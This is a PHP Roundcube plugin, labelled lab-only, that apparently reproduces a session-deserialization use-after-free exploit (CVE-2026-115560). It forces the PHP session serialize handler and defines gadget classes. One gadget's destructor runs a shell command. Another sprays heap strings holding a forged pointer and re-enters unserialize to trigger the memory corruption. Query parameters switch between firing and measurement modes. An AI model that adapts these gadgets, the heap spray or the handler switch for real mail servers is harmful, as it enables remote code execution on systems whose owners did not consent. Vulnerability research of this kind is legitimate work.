<?php
/*
 * LAB-ONLY Roundcube plugin for CVE-2026-115560.
 *
 * Loaded by rcube_plugin_api::load_plugins() inside rcmail::startup(), BEFORE
 * rcmail::session_init() -> rcube_session::start() -> session_start(). The
 * top-level code below therefore runs before the session decode and does two
 * things:
 *
 *   1. mirrors rcube_session::register_session_handler()'s runtime
 *      ini_set('session.serialize_handler', 'php') (stock Roundcube only
 *      executes that line for db/redis/memcache session storage);
 *   2. defines the gadget classes that the upload-progress session value can
 *      instantiate during the decode.
 *
 * Targets 127.0.0.1 only. The only command is the fixed benign
 * "id>/tmp/vd 2>&1"; there is no arbitrary-command interface.
 *
 * Controls (no restart needed):
 *   touch /tmp/rc-vd-noswitch  -> skip the runtime handler switch
 *   touch /tmp/rc-vd-nogadget  -> do not define VdSimple/CachePurge
 */

function rc_vd_log($s)
{
    @file_put_contents('/tmp/rc-vd.log',
        sprintf("%.6f pid=%d %s\n", microtime(true), getmypid(), $s),
        FILE_APPEND);
}

rc_vd_log('plugin-load handler=' . ini_get('session.serialize_handler')
    . ' name=' . ini_get('session.name'));

if (!file_exists('/tmp/rc-vd-noswitch')) {
    // Same shape as rcube_session::register_session_handler().
    @ini_set('session.serialize_handler', 'php');
    rc_vd_log('handler-switched handler=' . ini_get('session.serialize_handler'));
}
else {
    rc_vd_log('handler-switch-DISABLED handler=' . ini_get('session.serialize_handler'));
}

if (!file_exists('/tmp/rc-vd-nogadget')) {
    /*
     * Simple gadget: the public 115560 shape. A destructor that executes the
     * fixed benign command. Used to prove the Roundcube precondition, plugin
     * load order and session write path without the var_destroy terminal.
     */
    class VdSimple
    {
        public function __destruct()
        {
            rc_vd_log('simple-dtor');
            @exec('id>/tmp/vd 2>&1');
        }
    }

    /*
     * Re-entry gadget: identical shape to the proven lab-115560 CachePurge
     * dtor. The object's `key` property is the 8 raw bytes of the forged
     * carrier pointer; the dtor sprays same-size strings and re-enters
     * @unserialize('R:<ref>;') so the var_destroy UAF is walked.
     *
     * ?m=4 -> skip dry mid-parse dtor, fire on the real var_destroy dtor
     * ?m=5 -> skip dry dtor, hold at the real one (measure)
     * ?m=0 -> hold at the first dtor (measure diagnostic)
     * ?m=2 -> fire-shaped spray then hold (address diagnostic)
     */
    class CachePurge
    {
        public $key;

        public function __destruct()
        {
            static $inv = 0;
            $inv++;
            $mode = $_GET['m'] ?? '1';
            rc_vd_log("dtor m=$mode inv=$inv");
            if (($mode === '4' || $mode === '5') && $inv === 1) {
                rc_vd_log('skip-first');
                return;
            }
            if ($mode === '5') {
                @file_put_contents('/tmp/meas_pid', getmypid());
                rc_vd_log('second-measure-sleep');
                sleep(20);
                return;
            }
            if ($mode === '0') {
                @file_put_contents('/tmp/meas_pid', getmypid());
                rc_vd_log('measure-sleep');
                sleep(20);
                return;
            }
            if ($mode === '2') {
                rc_vd_spray((string)$this->key, (int)($_GET['s'] ?? 8135));
                @file_put_contents('/tmp/meas_pid', getmypid());
                rc_vd_log('spray-done');
                sleep(20);
                return;
            }
            if ($mode !== '1' && $mode !== '4') {
                return;
            }
            rc_vd_spray((string)$this->key, (int)($_GET['s'] ?? 8135));
            $ref = (int)($_GET['r'] ?? 1020);
            rc_vd_log("ref=$ref");
            $r = @unserialize('R:' . $ref . ';');
            rc_vd_log('after-unserialize');
            unset($r);
            rc_vd_log('fire-end');
        }
    }

    function rc_vd_spray($token, $slen)
    {
        $spray = [];
        for ($i = 0; $i < 64; $i++) {
            $s = str_repeat("\x41", $slen);
            $q = substr($token . str_repeat("\x00", 8), 0, 8);
            for ($j = 0; $j < 8; $j++) {
                $s[$j] = $q[$j];
            }
            $spray[] = $s;
        }
        return $spray;
    }
}
else {
    rc_vd_log('gadget-classes-DISABLED');
}

class vd115560 extends rcube_plugin
{
    public $task = '.*';

    public function init()
    {
        rc_vd_log('plugin-init task=' . ($this->task ?? ''));
    }
}
